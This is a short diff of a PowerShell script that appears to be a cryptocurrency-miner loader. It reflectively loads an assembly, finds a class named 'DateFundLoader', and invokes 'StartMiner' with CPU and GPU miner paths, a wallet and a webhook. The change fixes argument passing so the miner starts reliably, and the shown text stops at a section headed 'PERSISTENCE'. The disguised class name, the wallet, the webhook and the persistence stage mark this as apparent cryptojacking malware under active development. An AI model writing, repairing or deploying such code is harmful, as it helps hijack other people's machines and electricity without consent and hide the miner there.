@@ -64,15 +64,14 @@ try {
     $loader = $assembly.GetTypes() | Where-Object { $_.Name -eq "DateFundLoader" } | Select-Object -First 1
     $startMethod = $loader.GetMethod("StartMiner")
 
-    $GpuArg = if ($NvidiaGpu -or $AmdGpu) { [string]$GpuExe } else { "" }
+    $GpuArg = if ($NvidiaGpu -or $AmdGpu) { $GpuExe } else { "" }
     $IsAmd = if ($AmdGpu) { "true" } else { "false" }
     
-    # Cast arguments explicitly to [string] to avoid PSObject conversion errors
-    $argsArray = [string[]]@([string]$CpuExe, [string]$GpuArg, [string]$Wallet, [string]$IsAmd, [string]$Webhook)
-    $startMethod.Invoke($null, @(,$argsArray))
+    # Passing everything as ONE single string to bypass PowerShell's PSObject wrapping issues
+    $combinedArgs = "$CpuExe|$GpuArg|$Wallet|$IsAmd|$Webhook"
+    $startMethod.Invoke($null, @([string]$combinedArgs))
 } catch {
     Write-Host "Initialization failed: $($_.Exception.Message)"
-    if ($_.Exception.InnerException) { Write-Host "Inner: $($_.Exception.InnerException.Message)" }
 }
 
 # --- PERSISTENCE ---
